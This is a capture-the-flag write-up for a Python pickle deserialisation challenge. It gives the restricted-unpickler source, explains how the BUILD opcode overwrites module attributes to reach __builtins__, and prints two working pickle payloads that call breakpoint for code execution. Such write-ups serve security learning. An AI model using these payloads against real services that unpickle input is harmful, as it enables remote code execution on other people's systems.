# smiley-faiss

i am happy with how this challenge turned out because of the theming

## challenge

```
#!/usr/local/bin/python3
# slightly modified. original at https://github.com/facebookresearch/faiss/blob/main/contrib/rpc.py
import pickle
from io import BytesIO
import importlib

safe_modules = {
    'numpy',
    'numpy.core.multiarray',
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe modules.
        if "save" in name or "load" in name:
            return
        if module in safe_modules:
             import safernumpy
             import safernumpy.core.multiarray
             return getattr({"numpy": safernumpy, "numpy.core.multiarray": safernumpy.core.multiarray}[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))

if __name__ == "__main__":
    #RestrictedUnpickler(BytesIO().load()
    RestrictedUnpickler(BytesIO(bytes.fromhex(input(">")))).load()
```

see [./smiley-faiss.zip](./smiley-faiss.zip) for full

## solution

ok basically one trick is that if you have getattr but not _getattribute (with ".") on a specific object, if you can get an attribute of that object that can have its attributes overwritten, it is easy to get rce

by that i mean:

```
class Dummy: pass

outer = Dummy()
outer.inner = Dummy()
outer.inner.escape = {'woohoo': breakpoint}
```

if you can get `outer`, and you can get `outer.inner`, then you can build something like `{"inner": whatever}` on outer and then get `outer.inner` to get `whatever`

so basically if it was just an object and it had a dictionary attribute (e.g. `__builtins__`) with a valuable object (e.g. `breakpoint`), it is not possible without having this inner-outer setup

if it is permitted in find_class to do `getattr(outer, name)` and also `getattr(outer.inner, name)` then one can `getattr(outer, "inner")` to get inner and then abuse the BUILD
opcode, which allows for arbitrary setattr (you may see where this is going). so, by doing BUILD with slotstate and `getattr(outer.inner, "escape")`, then you can get the breakpoint function (in this example).

however, with this challenge, one has to do a double extension with numpy.core and then numpy.core.multiarray. this is not possible with the original importlib impl for some reason because it bypasses our overwriting of attributes (probably because it is importing the module again instead of using getattr)

so, a valid payload is 

```(GLOBAL + b"numpy\ncore\n" + NONE + MARK + UNICODE + b'multiarray\n' + GLOBAL + b'numpy\ncore\n' + DICT + TUPLE2 + BUILD + POP + GLOBAL + b'numpy\ncore\n' + NONE + GLOBAL + b'numpy\n__builtins__\n' + TUPLE2 + BUILD + GLOBAL + b'numpy.core.multiarray\nbreakpoint\n' + EMPTY_TUPLE + REDUCE + STOP).hex()```

there is also an unintended apparently that you can just build once and then it works (shoutout flocto)

(i forgot to ban arb getattr on the outer so you can just build `outer.__builtins__` onto `outer` and then get `outer.breakpoint` lol)

```
pkl = ( 
        GLOBAL + b"numpy\nsafernumpy\n" +
        MARK + 
            NONE + 
            GLOBAL + b"numpy\n__builtins__\n" + 
        TUPLE + 
        BUILD + 
        GLOBAL + b"numpy\nbreakpoint\n" + 
        EMPTY_TUPLE + 
        REDUCE +
       STOP
)
```
